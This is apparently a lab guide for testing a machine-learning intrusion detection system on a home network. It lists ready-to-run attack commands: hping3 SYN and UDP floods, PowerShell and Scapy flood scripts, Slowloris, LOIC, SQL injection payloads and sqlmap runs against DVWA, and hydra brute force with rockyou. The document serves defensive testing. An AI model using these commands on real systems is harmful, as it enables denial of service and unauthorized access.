# Attack Testing Guide for IDS/IPS System

## Your Network Setup

```
┌─────────────────────┐
│  Host PC (Windows)  │  192.168.100.238
│   (Attacker PC)     │
└──────────┬──────────┘
           │
           │ Network: 192.168.100.0/24
           │
┌──────────┴──────────┐       ┌─────────────────────┐
│  Kali Linux VM      │       │   Victim Machine    │
│  (IDS Monitor)      │◄─────►│  (Target/Victim)    │
│  192.168.100.210    │       │  192.168.100.XXX    │
└─────────────────────┘       └─────────────────────┘
```

## Attack Types Detected by Your Model

Your XGBoost model detects these attack classes:
1. **Brute Force - Web** (HTTP brute force)
2. **Brute Force - XSS** (Cross-site scripting attempts)
3. **DDOS attack-HOIC** (High Orbit Ion Cannon)
4. **DDOS attack-LOIC-UDP** (Low Orbit Ion Cannon UDP)
5. **DDoS attacks-LOIC-HTTP** (LOIC HTTP floods)
6. **DoS attacks-GoldenEye** (HTTP DoS)
7. **DoS attacks-Hulk** (Web server DoS)
8. **DoS attacks-SlowHTTPTest** (Slowloris variants)
9. **DoS attacks-Slowloris** (Slow HTTP DoS)
10. **SQL Injection** (Database attacks)
11. **Normal** (Legitimate traffic)

---

## Setup Options

### Option 1: Host PC as Attacker → Kali VM Monitors & Victim
**Simplest setup** - Attack your own Kali VM

```
Host PC (192.168.100.238)
    ↓ Attack Traffic
Kali VM (192.168.100.210) ← IDS monitors this interface
```

### Option 2: Three Machine Setup (Recommended)
**Most realistic** - Separate victim, monitor, attacker

```
Attacker PC → Victim PC
              ↑
              │ (IDS monitors this traffic)
         Kali VM (port mirroring or promiscuous mode)
```

### Option 3: Kali as Man-in-the-Middle
**Advanced** - Kali intercepts traffic between attacker and victim

```
Attacker PC → Kali VM (bridge mode) → Victim PC
              ↑ IDS monitors bridge
```

---

## Step-by-Step Testing

### Phase 1: Update Whitelist (Important!)

First, **remove your attack source** from whitelist:

```bash
# Edit config/config.py
nano /home/kali/Desktop/bk-ids/config/config.py
```

**Change this:**
```python
'whitelist': [
    # '192.168.100.238',  # COMMENT OUT host PC if attacking from here
    '192.168.100.210',    # Keep Kali VM whitelisted
    '127.0.0.1',
],
'whitelist_subnets': [
    # '192.168.100.0/24',  # COMMENT OUT local subnet
    '10.0.0.0/8',
    '172.16.0.0/12',
],
```

### Phase 2: Start IDS on Kali VM

```bash
cd /home/kali/Desktop/bk-ids
sudo python main.py --mode LIVE --interface eth0 --threshold 0.85
```

Keep this running in one terminal.

---

## Attack Scenarios

### 🎯 Scenario 1: SYN Flood (DoS Attack)

**From Windows Host PC:**

Install `hping3` (using WSL2):
```bash
# In WSL2 Ubuntu
sudo apt update
sudo apt install hping3

# Launch SYN flood
sudo hping3 -S -p 80 --flood 192.168.100.210
```

**From Linux Attacker:**
```bash
sudo hping3 -S -p 80 --flood 192.168.100.210
# Or
sudo hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood 192.168.100.210
```

**Expected Detection:** `DoS attacks-GoldenEye` or similar DoS category

---

### 🎯 Scenario 2: UDP Flood (DDoS-LOIC-UDP)

**From Windows (PowerShell as Admin):**
```powershell
# Simple UDP flood using PowerShell
$ip = "192.168.100.210"
$port = 53
$endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse($ip), $port)
$udpclient = New-Object System.Net.Sockets.UdpClient

for ($i=0; $i -lt 10000; $i++) {
    $bytes = [System.Text.Encoding]::ASCII.GetBytes("FLOOD" * 100)
    $udpclient.Send($bytes, $bytes.Length, $endpoint) | Out-Null
}
```

**From Linux:**
```bash
# Install hping3
sudo apt install hping3

# UDP flood
sudo hping3 --udp -p 53 --flood 192.168.100.210

# Or use netcat in a loop
while true; do echo "FLOOD" | nc -u 192.168.100.210 53; done
```

**Expected Detection:** `DDOS attack-LOIC-UDP`

---

### 🎯 Scenario 3: HTTP Flood (Web DoS)

**Setup victim web server on Kali first:**
```bash
# Start simple web server on Kali
python3 -m http.server 8080
```

**From Windows (PowerShell):**
```powershell
# HTTP flood
for ($i=0; $i -lt 1000; $i++) {
    Invoke-WebRequest -Uri "http://192.168.100.210:8080" -UseBasicParsing
}
```

**From Linux:**
```bash
# Install Apache Bench
sudo apt install apache2-utils

# HTTP flood
ab -n 10000 -c 100 http://192.168.100.210:8080/

# Or use curl in loop
for i in {1..1000}; do curl http://192.168.100.210:8080/ & done
```

**From Windows using LOIC (actual tool):**
1. Download LOIC: https://sourceforge.net/projects/loic/
2. Run `LOIC.exe`
3. Enter target: `192.168.100.210`
4. Select method: HTTP
5. Click "IMMA CHARGIN MAH LAZER"

**Expected Detection:** `DDoS attacks-LOIC-HTTP` or `DoS attacks-Hulk`

---

### 🎯 Scenario 4: Slowloris Attack

**From Linux:**
```bash
# Install slowloris
git clone https://github.com/gkbrk/slowloris.git
cd slowloris

# Launch slowloris
python3 slowloris.py 192.168.100.210 -p 80 -s 200
```

**From Windows (Python):**
```bash
# In WSL2 or install Python on Windows
pip install slowloris
slowloris 192.168.100.210
```

**Expected Detection:** `DoS attacks-Slowloris` or `DoS attacks-SlowHTTPTest`

---

### 🎯 Scenario 5: SQL Injection

**Setup victim with vulnerable web app:**
```bash
# On Kali VM, run DVWA (Damn Vulnerable Web App)
docker run -d -p 80:80 vulnerables/web-dvwa

# Access at: http://192.168.100.210
# Default login: admin/password
```

**From Windows or Linux browser:**
```bash
# Test SQL injection attempts
curl "http://192.168.100.210/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit"
curl "http://192.168.100.210/vulnerabilities/sqli/?id=1 UNION SELECT null, table_name FROM information_schema.tables--"

# Or use sqlmap
sqlmap -u "http://192.168.100.210/vulnerabilities/sqli/?id=1&Submit=Submit" --batch
```

**Expected Detection:** `SQL Injection`

---

### 🎯 Scenario 6: Brute Force Attack

**SSH Brute Force from Linux:**
```bash
# Install hydra
sudo apt install hydra

# Brute force SSH (make sure SSH is running on target)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.210
```

**HTTP Brute Force:**
```bash
# Against web login
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.100.210 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

**Expected Detection:** `Brute Force - Web` or `Brute Force - XSS`

---

### 🎯 Scenario 7: Port Scan (Reconnaissance)

**From Windows:**
```bash
# Using Nmap in WSL2
sudo nmap -sS -p- 192.168.100.210

# Fast scan
sudo nmap -F 192.168.100.210
```

**From Linux:**
```bash
# Full port scan
sudo nmap -sS -p- -T4 192.168.100.210

# Aggressive scan
sudo nmap -A -T4 192.168.100.210
```

**Note:** Port scans might not trigger alerts (depends on model training)

---

## Advanced Testing Tools

### Metasploit Framework

```bash
# On attacker machine
sudo apt install metasploit-framework

# Start Metasploit
msfconsole

# Example: Exploit vulnerable service
msf6 > use auxiliary/scanner/http/http_version
msf6 > set RHOSTS 192.168.100.210
msf6 > run
```

### Scapy (Python-based attacks)

```python
from scapy.all import *

# SYN flood
target = "192.168.100.210"
for i in range(1000):
    send(IP(dst=target)/TCP(dport=80, flags="S"))

# UDP flood  
for i in range(1000):
    send(IP(dst=target)/UDP(dport=53)/Raw(load="X"*1024))
```

---

## Monitoring Attacks

### Watch IDS Logs in Real-Time

```bash
# In separate terminal
tail -f /home/kali/Desktop/bk-ids/logs/ids_system.log

# Or watch attacks
watch -n 1 'tail -20 /home/kali/Desktop/bk-ids/logs/ids_system.log | grep ATTACK'
```

### Check Network Traffic

```bash
# Monitor incoming connections
sudo tcpdump -i eth0 -n | grep 192.168.100.238

# Count packets per second
sudo tcpdump -i eth0 -n -c 100 | wc -l
```

---

## Validation Checklist

After launching each attack:

- [ ] IDS logs show `[WARNING] ATTACK DETECTED`
- [ ] Attack type matches expected category
- [ ] Confidence score > 85% (or your threshold)
- [ ] Source IP is correct
- [ ] Timestamp is accurate
- [ ] No false negatives (attack not detected)

---

## Safe Testing Practices

### ⚠️ IMPORTANT WARNINGS

1. **Only test on YOUR OWN network**
   - Never attack systems you don't own
   - Illegal and unethical

2. **Isolate test environment**
   - Use isolated VM network or VLAN
   - Don't flood production systems

3. **Rate limiting**
   - Start with low-rate attacks
   - Gradually increase intensity
   - Monitor system resources

4. **Backup first**
   - Snapshot VMs before testing
   - Backup important data

5. **Legal compliance**
   - Get written permission if testing work systems
   - Document testing scope and timeline

---

## Troubleshooting

### No Attacks Detected?

**Check 1: Whitelist**
```bash
grep -A 5 "whitelist" /home/kali/Desktop/bk-ids/config/config.py
# Make sure attacker IP is NOT whitelisted
```

**Check 2: Interface**
```bash
ip addr show eth0
# Make sure IDS is monitoring correct interface
```

**Check 3: Threshold**
```bash
# Try lowering threshold
sudo python main.py --mode LIVE --interface eth0 --threshold 0.70
```

**Check 4: Logs**
```bash
# Check for errors
tail -100 /home/kali/Desktop/bk-ids/logs/ids_system.log | grep ERROR
```

### False Positives?

- **Increase threshold**: `--threshold 0.95`
- **Add to whitelist**: Edit `config/config.py`
- **Check feature mapping**: Review `src/feature_adapter.py`

### System Crashes?

- **Too much traffic**: Reduce attack rate
- **Memory exhausted**: Restart IDS, lower flow tracking timeout
- **CPU overload**: Close other applications

---

## Example Complete Test Session

```bash
# Terminal 1: Start IDS
cd /home/kali/Desktop/bk-ids
sudo python main.py --mode LIVE --interface eth0 --threshold 0.85

# Terminal 2: Watch logs
tail -f logs/ids_system.log | grep --color=always ATTACK

# Terminal 3: Launch attack (on attacker PC)
# From Windows PowerShell:
hping3 -S -p 80 --flood 192.168.100.210

# Expected output in Terminal 2:
# [WARNING] ATTACK DETECTED: DoS attacks-GoldenEye from 192.168.100.238
```

---

## Next Steps

1. ✅ Test each attack type systematically
2. ✅ Document detection rates (true positives)
3. ✅ Adjust threshold based on results
4. ✅ Fine-tune whitelist
5. ✅ Enable auto-block for confirmed attacks
6. ✅ Set up alerting (email/SMS) for production

---

## Additional Resources

### Attack Tools
- **LOIC/HOIC**: https://sourceforge.net/projects/loic/
- **Slowloris**: https://github.com/gkbrk/slowloris
- **Metasploit**: https://www.metasploit.com/
- **Hydra**: https://github.com/vanhauser-thc/thc-hydra
- **SQLMap**: https://sqlmap.org/

### Learning Resources
- **CIC-IDS2018 Dataset**: https://www.unb.ca/cic/datasets/ids-2018.html
- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
- **Kali Linux Tools**: https://www.kali.org/tools/

### Legal & Ethical
- **EC-Council CEH**: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/
- **HackerOne Bug Bounty**: https://www.hackerone.com/
- **SANS Penetration Testing**: https://www.sans.org/cyber-security-courses/

---

**Remember**: Always test ethically and legally! 🛡️
